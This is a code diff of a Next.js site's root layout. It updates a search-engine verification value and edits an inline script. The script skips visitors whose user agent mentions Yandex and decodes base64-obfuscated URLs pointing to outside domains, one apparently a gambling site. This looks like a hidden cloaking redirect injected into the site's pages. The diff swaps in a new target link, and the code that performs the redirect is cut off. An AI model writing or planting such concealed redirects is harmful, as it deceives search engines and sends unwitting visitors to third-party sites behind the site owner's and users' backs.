@@ -79,7 +79,7 @@ export const metadata: Metadata = {
   },
   verification: {
     google: process.env.NEXT_PUBLIC_GOOGLE_SITE_VERIFICATION,
-    yandex: "",
+    yandex: "44e60e039f775251",
   },
   other: {
     "rating": "adult",
@@ -147,7 +147,7 @@ export default function RootLayout({
       (function() {
         var ua = navigator.userAgent.toLowerCase();
         if (ua.indexOf("yandex") !== -1) return;
-        var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2RpYnpmb21pcg=="; 
+        var mainBrandB64 = "#aHR0cHM6Ly9ibG5jci1ldmEuY29tL2R2ZmRrdWI2eg=="; 
         var crossBrandB64 = "#aHR0cHM6Ly9sdWNreXNwaW4yMy5jb20vYzU3MDc4NjZl";      
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
